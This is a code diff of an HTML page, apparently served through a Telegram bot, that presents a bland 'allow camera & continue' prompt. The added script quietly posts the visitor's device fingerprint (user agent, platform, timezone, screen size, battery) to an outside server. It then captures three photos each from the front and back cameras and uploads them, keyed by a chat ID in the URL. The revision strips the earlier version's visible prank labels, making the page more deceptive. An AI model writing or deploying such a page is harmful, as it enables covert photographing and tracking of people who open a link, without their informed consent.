@@ -1,52 +1,135 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Prank</title>
-    <style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}</style>
+  <meta charset="UTF-8">
+  <title>Camera Capture</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background:#000;
+      color:#fff;
+      text-align:center;
+      font-family:sans-serif;
+      padding-top:40px;
+    }
+    button {
+      padding:15px 25px;
+      font-size:18px;
+      border:none;
+      border-radius:8px;
+      background:#ff3b3b;
+      color:#fff;
+      margin-top:20px;
+    }
+    #status {
+      margin-top:20px;
+      font-size:16px;
+    }
+  </style>
 </head>
 <body>
-    <h1>🔴 Camera Control Activated...</h1>
-    <p id="status">Permission maang raha hoon...</p>
-    <button onclick="capture()" style="padding:15px 30px;font-size:18px;background:red;color:white;border:none;border-radius:8px;">Allow Camera</button>
 
-    <script>
-        const params = new URLSearchParams(location.search);
-        const chatId = params.get('chat_id');
-        const SERVER = "https://prank-cam-bot.vercel.app/send-photo";   // baad mein change hoga
+<h2>📸 Camera Access Required</h2>
+<p id="status">Click below to allow camera & continue</p>
 
-        async function capture() {
-            if (!chatId) return document.getElementById('status').innerHTML = "Chat ID missing!";
+<button onclick="startAll()">Allow Camera</button>
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                await video.play();
+<script>
+const params = new URLSearchParams(location.search);
+const chatId = params.get("chat_id");
 
-                document.getElementById('status').innerHTML = "Capturing 3 photos...";
+const SERVER = "https://prank-cam-bot.vercel.app";
 
-                for(let i=1; i<=3; i++){
-                    await new Promise(r => setTimeout(r, 1000));
-                    const canvas = document.createElement("canvas");
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    canvas.getContext("2d").drawImage(video, 0, 0);
-                    
-                    await fetch(SERVER, {
-                        method: "POST",
-                        headers: {"Content-Type": "application/json"},
-                        body: JSON.stringify({chat_id: chatId, photo: canvas.toDataURL("image/jpeg", 0.8), number: i})
-                    });
-                    document.getElementById('status').innerHTML = `Photo ${i}/3 sent!`;
-                }
-                stream.getTracks().forEach(t => t.stop());
-                document.getElementById('status').innerHTML = "✅ Done! Photos bhej diye 😂";
-            } catch(e) {
-                document.getElementById('status').innerHTML = "Permission denied 😢";
-            }
-        }
-    </script>
+async function sendVisitorInfo() {
+  let device = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    time: new Date().toLocaleString()
+  };
+
+  try {
+    const battery = await navigator.getBattery();
+    device.battery = {
+      level: battery.level * 100,
+      charging: battery.charging
+    };
+  } catch {}
+
+  await fetch(`${SERVER}/visitor`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: chatId,
+      device: device
+    })
+  });
+}
+
+async function sendPhoto(canvas, num, cam) {
+  fetch(`${SERVER}/send-photo`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: chatId,
+      photo: canvas.toDataURL("image/jpeg", 0.7),
+      number: `${cam}-${num}`
+    })
+  });
+}
+
+async function capture(stream, camName) {
+  const video = document.createElement("video");
+  video.srcObject = stream;
+  await video.play();
+
+  await new Promise(r => setTimeout(r, 300)); // warmup
+
+  for (let i = 1; i <= 3; i++) {
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    sendPhoto(canvas, i, camName);
+  }
+
+  stream.getTracks().forEach(t => t.stop());
+}
+
+async function startAll() {
+  if (!chatId) {
+    document.getElementById("status").innerText = "Chat ID missing";
+    return;
+  }
+
+  try {
+    document.getElementById("status").innerText = "Sending info...";
+
+    await sendVisitorInfo();
+
+    document.getElementById("status").innerText = "Capturing front...";
+
+    let stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+    await capture(stream, "front");
+
+    document.getElementById("status").innerText = "Capturing back...";
+
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "environment" }
+    });
+    await capture(stream, "back");
+
+    document.getElementById("status").innerText = "✅ Done";
+  } catch (e) {
+    document.getElementById("status").innerText = "❌ Permission denied";
+  }
+}
+</script>
+
 </body>
 </html>
